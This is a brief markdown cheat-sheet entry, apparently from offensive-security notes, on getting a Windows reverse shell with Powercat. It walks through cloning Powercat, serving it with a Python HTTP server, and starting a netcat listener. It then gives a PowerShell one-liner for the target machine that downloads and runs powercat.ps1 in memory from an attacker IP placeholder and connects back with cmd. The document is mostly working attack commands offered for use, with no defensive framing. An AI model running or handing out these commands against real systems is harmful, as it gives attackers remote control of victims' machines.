# Powercat: Reverse Shell

1. Download [Powercat](https://github.com/besimorhino/powercat.git)

        git clone https://github.com/besimorhino/powercat.git
        python -m SimpleHTTPServer 4444

2. Start a listener on attacker machine

        nc -lvp 1234

3. Execute following command on the remote machine to obtain a reverse shell
   
        powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP_ADDRESS>:4444/powercat.ps1');powercat -c <ATTACKER_IP_ADDRESS> -p 1234 -e cmd"

## References

* https://github.com/besimorhino/powercat.git
* https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
* https://zsahi.wordpress.com/2018/09/17/windows-non-interactive-command-execution-to-interactive-netcat-reverse-shell/
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md